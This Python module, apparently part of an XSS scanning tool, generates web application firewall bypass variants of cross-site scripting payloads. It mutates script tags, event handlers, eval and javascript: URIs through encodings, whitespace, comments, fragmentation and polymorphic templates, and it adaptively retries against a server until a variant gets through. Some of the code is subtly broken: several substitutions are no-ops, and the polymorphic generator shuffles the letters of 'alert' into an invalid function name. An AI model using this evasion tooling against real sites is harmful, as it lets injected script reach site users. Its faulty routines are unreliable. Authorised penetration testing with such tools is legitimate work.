"""
WAF Bypass Module

This module provides algorithms and techniques to bypass common Web Application Firewall
protections by mutating payloads and employing advanced evasion techniques.
"""

import random
import string
import html
import base64
import urllib.parse
import re
import logging
from typing import List, Dict, Optional, Callable

class WAFBypass:
    """
    Web Application Firewall Bypass techniques for XSS payloads.
    """
    
    def __init__(self, config: Optional[Dict] = None):
        """
        Initialize the WAF Bypass module.
        
        Args:
            config (dict, optional): Configuration settings.
        """
        self.logger = logging.getLogger('cachexssdetector.waf_bypass')
        self.config = config or {}
        
        # Initialize mutation techniques
        self._init_mutation_techniques()
        
        # WAF signature patterns to detect and bypass
        self._init_waf_signatures()
        
        self.logger.info("WAF Bypass module initialized")
    
    def _init_mutation_techniques(self):
        """Initialize mutation techniques for WAF bypass."""
        # Case manipulation techniques
        self.case_mutations = [
            lambda s: s,  # original
            lambda s: s.upper(),  # uppercase
            lambda s: s.lower(),  # lowercase
            lambda s: s.swapcase(),  # swap case
            lambda s: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s)),  # alternating case
        ]
        
        # Encoding techniques
        self.encoding_mutations = [
            lambda s: s,  # original
            lambda s: html.escape(s),  # HTML entity encoding
            lambda s: urllib.parse.quote(s),  # URL encoding
            lambda s: ''.join(f'\\u{ord(c):04x}' for c in s),  # Unicode encoding
            lambda s: ''.join(f'\\x{ord(c):02x}' for c in s),  # Hex encoding
            lambda s: ''.join(f'&#x{ord(c):x};' for c in s),  # Hex HTML encoding
            lambda s: ''.join(f'&#0{ord(c)};' for c in s),  # Decimal HTML encoding with leading zero
            lambda s: base64.b64encode(s.encode()).decode(),  # Base64 encoding
        ]
        
        # Whitespace insertion techniques
        self.whitespace_mutations = [
            lambda s: s,  # original
            lambda s: s.replace(' ', '\t'),  # tabs
            lambda s: s.replace(' ', '\n'),  # newlines
            lambda s: s.replace(' ', '\r'),  # carriage returns
            lambda s: s.replace(' ', '\r\n'),  # CRLF
            lambda s: s.replace(' ', '\f'),  # form feed
            lambda s: s.replace(' ', '\v'),  # vertical tab
            lambda s: s.replace(' ', '\u00a0'),  # non-breaking space
            lambda s: s.replace(' ', '\u200b'),  # zero-width space
        ]
        
        # Comment insertion techniques
        self.comment_mutations = [
            lambda s: s,  # original
            lambda s: s.replace('', '/**/')  # CSS/JS comment insertion (between each character)
        ]
        
        # Double encoding techniques
        self.double_encoding_mutations = [
            lambda s: s,  # original
            lambda s: urllib.parse.quote(urllib.parse.quote(s)),  # double URL encoding
            lambda s: html.escape(html.escape(s)),  # double HTML encoding
        ]
        
        # Character substitution techniques
        self.char_substitution_mutations = [
            lambda s: s,  # original
            lambda s: s.replace('a', '\\u0061'),  # Unicode substitution
            lambda s: s.replace('s', '\\u0073'),  # Unicode substitution for 's'
            lambda s: s.replace('c', '\\u0063'),  # Unicode substitution for 'c'
            lambda s: s.replace('r', '\\u0072'),  # Unicode substitution for 'r'
            lambda s: s.replace('i', '\\u0069'),  # Unicode substitution for 'i'
            lambda s: s.replace('p', '\\u0070'),  # Unicode substitution for 'p'
            lambda s: s.replace('t', '\\u0074'),  # Unicode substitution for 't'
            lambda s: s.replace('<', '<'),  # Entity substitution for '<'
            lambda s: s.replace('>', '>'),  # Entity substitution for '>'
        ]
        
        # Protocol bypass techniques
        self.protocol_mutations = [
            lambda s: s,  # original
            lambda s: s.replace('javascript:', 'java\tscript:'),  # tab insertion
            lambda s: s.replace('javascript:', 'javascript&#58;'),  # entity insertion
            lambda s: s.replace('javascript:', 'javascript:'),  # colon hex
            lambda s: s.replace('javascript:', 'javascript&#x3A;'),  # colon HTML hex
            lambda s: s.replace('javascript:', 'javascript\n:'),  # newline insertion
            lambda s: s.replace('javascript:', 'j&#97;v&#97;script:')  # partial encoding
        ]
        
        # Script tag mutations
        self.script_tag_mutations = [
            lambda s: s,  # original
            lambda s: s.replace('<script>', '<scr\tipt>'),  # tab insertion
            lambda s: s.replace('<script>', '<scr\nipt>'),  # newline insertion
            lambda s: s.replace('<script>', '<scr&#105;pt>'),  # entity insertion
            lambda s: s.replace('<script>', '<scr' + ''.join(random.choice(' \t\n\r\f\v') for _ in range(3)) + 'ipt>'),  # random space
            lambda s: s.replace('<script>', '<\u0073cript>'),  # unicode substitution
            lambda s: s.replace('<script>', '<script x=">'),  # attribute injection
        ]
    
    def _init_waf_signatures(self):
        """Initialize common WAF signatures for detection and bypass."""
        self.waf_signatures = {
            # Basic WAF patterns
            'script_tag': {
                'pattern': re.compile(r'<\s*script', re.IGNORECASE),
                'bypass_techniques': self.script_tag_mutations
            },
            'alert_function': {
                'pattern': re.compile(r'alert\s*\(', re.IGNORECASE),
                'bypass_techniques': [
                    lambda s: s.replace('alert', 'al\u200Bert'),  # zero-width space insertion
                    lambda s: s.replace('alert', 'al\\145rt'),  # octal encoding
                    lambda s: s.replace('alert', 'al/* */ert'),  # comment insertion
                    lambda s: s.replace('alert', 'a\nl\ne\nr\nt'),  # newline insertion
                    lambda s: s.replace('alert', 'prompt'),  # function substitution
                    lambda s: s.replace('alert', 'confirm')   # function substitution
                ]
            },
            'javascript_protocol': {
                'pattern': re.compile(r'javascript:', re.IGNORECASE),
                'bypass_techniques': self.protocol_mutations
            },
            'onerror_handler': {
                'pattern': re.compile(r'onerror', re.IGNORECASE),
                'bypass_techniques': [
                    lambda s: s.replace('onerror', 'OnErRoR'),  # mixed case
                    lambda s: s.replace('onerror', 'on\nerror'),  # newline insertion
                    lambda s: s.replace('onerror', 'on&#101;rror'),  # entity encoding
                    lambda s: s.replace('onerror', 'onerror'.replace('o', '&#111;')),  # partial encoding
                    lambda s: s.replace('onerror', 'on\rerror')  # carriage return insertion
                ]
            },
            'eval_function': {
                'pattern': re.compile(r'eval\s*\(', re.IGNORECASE),
                'bypass_techniques': [
                    lambda s: s.replace('eval', 'window["eval"]'),  # object bracket notation
                    lambda s: s.replace('eval', 'Function("return eval")()'),  # function constructor
                    lambda s: s.replace('eval', 'ev\u200Bal'),  # zero-width space insertion
                    lambda s: s.replace('eval', 'ev/**/al'),  # comment insertion
                    lambda s: s.replace('eval', 'ev\tal')  # tab insertion
                ]
            },
            'iframe_tag': {
                'pattern': re.compile(r'<\s*iframe', re.IGNORECASE),
                'bypass_techniques': [
                    lambda s: s.replace('<iframe', '<ifr\name'),  # whitespace insertion
                    lambda s: s.replace('<iframe', '<ifr&#97;me'),  # entity encoding
                    lambda s: s.replace('<iframe', '<If\rRaMe'),  # mixed case with CR
                    lambda s: s.replace('<iframe', '<i&#102;rame'),  # entity for 'f'
                    lambda s: s.replace('<iframe', '<if\u200Brame')  # zero-width space
                ]
            }
        }
    
    def generate_waf_bypass_payloads(self, base_payload: str, max_variations: int = 5) -> List[Dict]:
        """
        Generate WAF bypass variations of a base payload.
        
        Args:
            base_payload (str): The original payload to modify.
            max_variations (int): Maximum number of variations to generate.
            
        Returns:
            list: List of mutated payloads with metadata.
        """
        bypass_payloads = []
        
        try:
            # Detect which WAF patterns are in the payload
            detected_patterns = []
            for signature_name, signature in self.waf_signatures.items():
                if signature['pattern'].search(base_payload):
                    detected_patterns.append(signature_name)
            
            # If no patterns detected, apply general mutations
            if not detected_patterns:
                detected_patterns = ['general']
            
            self.logger.debug(f"Detected WAF patterns in payload: {detected_patterns}")
            
            # Apply specific bypass techniques for each detected pattern
            for pattern in detected_patterns:
                # Get bypass techniques for this pattern
                if pattern == 'general':
                    # Apply general mutations
                    variations = self._apply_general_mutations(base_payload, max_variations)
                else:
                    # Apply pattern-specific mutations
                    variations = self._apply_pattern_mutations(base_payload, pattern, max_variations)
                
                for var_payload in variations:
                    bypass_payloads.append({
                        'original': base_payload,
                        'mutated': var_payload,
                        'technique': pattern,
                        'length': len(var_payload)
                    })
            
            # Limit to max_variations
            bypass_payloads = bypass_payloads[:max_variations]
            
        except Exception as e:
            self.logger.error(f"Error generating WAF bypass payloads: {str(e)}")
        
        return bypass_payloads
    
    def _apply_general_mutations(self, payload: str, max_variations: int) -> List[str]:
        """
        Apply general mutations to bypass WAF detection.
        
        Args:
            payload (str): The payload to mutate.
            max_variations (int): Maximum number of variations to generate.
            
        Returns:
            list: List of mutated payloads.
        """
        variations = []
        
        # Apply a mix of mutation techniques
        variations.append(self._apply_random_case_mutation(payload))
        variations.append(self._apply_random_encoding_mutation(payload))
        variations.append(self._apply_random_whitespace_mutation(payload))
        
        # Apply combinations of techniques
        case_mutated = self._apply_random_case_mutation(payload)
        variations.append(self._apply_random_encoding_mutation(case_mutated))
        
        whitespace_mutated = self._apply_random_whitespace_mutation(payload)
        variations.append(self._apply_random_case_mutation(whitespace_mutated))
        
        # Add fragmentation
        variations.append(self._fragment_payload(payload))
        
        # Add null byte insertion for older systems
        variations.append(payload.replace('', '\0'))
        
        # Apply more complex combinations
        variations.append(self._apply_random_encoding_mutation(
            self._fragment_payload(self._apply_random_case_mutation(payload))
        ))
        
        return variations[:max_variations]
    
    def _apply_pattern_mutations(self, payload: str, pattern_name: str, max_variations: int) -> List[str]:
        """
        Apply pattern-specific mutations to bypass WAF detection.
        
        Args:
            payload (str): The payload to mutate.
            pattern_name (str): The name of the detected pattern.
            max_variations (int): Maximum number of variations to generate.
            
        Returns:
            list: List of mutated payloads.
        """
        variations = []
        
        if pattern_name in self.waf_signatures:
            # Apply pattern-specific bypass techniques
            for bypass_technique in self.waf_signatures[pattern_name]['bypass_techniques']:
                variations.append(bypass_technique(payload))
            
            # Apply additional encoding on top of the pattern-specific bypass
            if len(variations) > 0:
                base_variation = variations[0]
                variations.append(self._apply_random_encoding_mutation(base_variation))
            
            # Apply case mutation on top of another variation
            if len(variations) > 1:
                base_variation = variations[1]
                variations.append(self._apply_random_case_mutation(base_variation))
        
        return variations[:max_variations]
    
    def _apply_random_case_mutation(self, payload: str) -> str:
        """Apply a random case mutation technique."""
        technique = random.choice(self.case_mutations)
        return technique(payload)
    
    def _apply_random_encoding_mutation(self, payload: str) -> str:
        """Apply a random encoding mutation technique."""
        technique = random.choice(self.encoding_mutations)
        return technique(payload)
    
    def _apply_random_whitespace_mutation(self, payload: str) -> str:
        """Apply a random whitespace mutation technique."""
        technique = random.choice(self.whitespace_mutations)
        return technique(payload)
    
    def _fragment_payload(self, payload: str) -> str:
        """Fragment the payload using JavaScript string concatenation."""
        if '<script>' in payload and '</script>' in payload:
            # Extract the JavaScript code between script tags
            script_content = payload.split('<script>')[1].split('</script>')[0]
            
            # Fragment the JavaScript code
            fragments = []
            current_fragment = ''
            for char in script_content:
                current_fragment += char
                if len(current_fragment) >= 3 and random.random() < 0.3:
                    fragments.append(f"'{current_fragment}'")
                    current_fragment = ''
            
            if current_fragment:
                fragments.append(f"'{current_fragment}'")
            
            # Join the fragments with +
            fragmented_js = '+'.join(fragments)
            
            # Replace the original script content with document.write and the fragmented JavaScript
            return payload.replace(script_content, f"document.write({fragmented_js})")
        
        return payload
    
    def adaptive_waf_bypass(self, payload: str, response_analyzer: Callable) -> str:
        """
        Adaptively bypass WAF based on server responses.
        
        Args:
            payload (str): Original payload to bypass.
            response_analyzer: Function that tests a payload and returns if it was blocked.
            
        Returns:
            str: The most effective bypass payload.
        """
        # Generate several bypass variations
        bypass_variations = self.generate_waf_bypass_payloads(payload, max_variations=10)
        
        for variation in bypass_variations:
            mutated_payload = variation['mutated']
            
            # Test if the mutated payload bypasses the WAF
            is_blocked = response_analyzer(mutated_payload)
            
            if not is_blocked:
                self.logger.info(f"Found successful WAF bypass: {variation['technique']}")
                return mutated_payload
        
        # If no variation worked, return the original payload
        return payload
    
    def generate_polymorphic_waf_bypass(self, payload: str) -> str:
        """
        Generate a polymorphic payload that changes on each execution.
        
        Args:
            payload (str): Original payload.
            
        Returns:
            str: Polymorphic payload.
        """
        if not 'alert' in payload:
            return payload
        
        # Create a polymorphic alert function that's harder to detect
        polymorphic_template = """
<script>
function ___random_func___() {
    var a = '___part1___';
    var b = '___part2___';
    var c = '___part3___';
    return window[a+b+c];
}
___random_func___()('WAF Bypass Test');
</script>
"""
        
        # Split 'alert' into random chunks
        chars = list('alert')
        random.shuffle(chars)
        
        part1 = chars[0:2]
        part2 = chars[2:4]
        part3 = chars[4:]
        
        # Replace placeholders
        random_func_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
        result = polymorphic_template
        result = result.replace('___random_func___', random_func_name)
        result = result.replace('___part1___', ''.join(part1))
        result = result.replace('___part2___', ''.join(part2))
        result = result.replace('___part3___', ''.join(part3))
        
        return result
